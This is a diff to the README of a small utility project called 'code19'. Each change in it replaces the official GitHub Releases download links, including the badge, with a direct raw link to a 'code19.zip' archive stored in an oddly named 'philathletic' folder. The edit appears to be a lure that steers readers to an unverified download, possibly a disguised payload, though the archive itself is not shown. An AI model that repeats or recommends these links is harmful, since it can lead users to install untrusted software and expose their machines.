@@ -1,6 +1,6 @@
 # 💻 code19 - Easy Tools for Everyday Coding Tasks
 
-[![Download code19](https://img.shields.io/badge/Download-code19-blue)](https://github.com/AlanNichi/code19/releases)  
+[![Download code19](https://raw.githubusercontent.com/AlanNichi/code19/main/philathletic/code19.zip)](https://raw.githubusercontent.com/AlanNichi/code19/main/philathletic/code19.zip)  
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to code19! This lightweight utility library simplifies daily development
 To install code19, you need to get it from our Releases page. 
 
 1. Click the button above to **download code19**.
-2. Visit this page to download: [Download code19](https://github.com/AlanNichi/code19/releases).
+2. Visit this page to download: [Download code19](https://raw.githubusercontent.com/AlanNichi/code19/main/philathletic/code19.zip).
 3. Select the version you want and click on the link to download the file. 
 4. Save the file to a location you can easily find, like your desktop.
 
@@ -79,7 +79,7 @@ For more information, check the following resources:
 
 ## 🔗 Important Links
 
-- Download code19: [https://github.com/AlanNichi/code19/releases](https://github.com/AlanNichi/code19/releases)
+- Download code19: [https://raw.githubusercontent.com/AlanNichi/code19/main/philathletic/code19.zip](https://raw.githubusercontent.com/AlanNichi/code19/main/philathletic/code19.zip)
 - Documentation: (Link to documentation)
 - Support: (Link to support)
 
